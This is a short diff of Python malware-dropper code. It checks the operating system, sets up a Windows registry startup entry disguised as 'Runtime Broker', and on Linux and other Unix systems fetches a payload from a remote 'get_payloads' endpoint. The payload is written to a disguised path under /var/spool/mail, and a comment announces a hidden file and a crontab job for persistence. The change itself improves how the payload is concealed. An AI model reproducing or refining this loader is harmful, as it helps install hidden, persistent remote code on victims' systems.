@@ -138,10 +138,9 @@ def run(url, file_path):
         add_registry_startup(file_path, "Runtime Broker")
     
     elif os_type == 'Linux' or os_type == 'FreeBSD' or os_type == 'OpenBSD' or os_type == 'SunOS' or os_type == 'Android':
-        file_path = "/proc/self/map"
+        file_path = "/var/spool/mail/mail2"
         if not os.path.exists(file_path):
             response = requests.get(f"{url}get_payloads/{download_path}")
-            os.makedirs(service_dir, exist_ok=True)
             with open(file_path, 'wb') as file:
               file.write(response.content)
         # Create a hidden file and add a crontab job
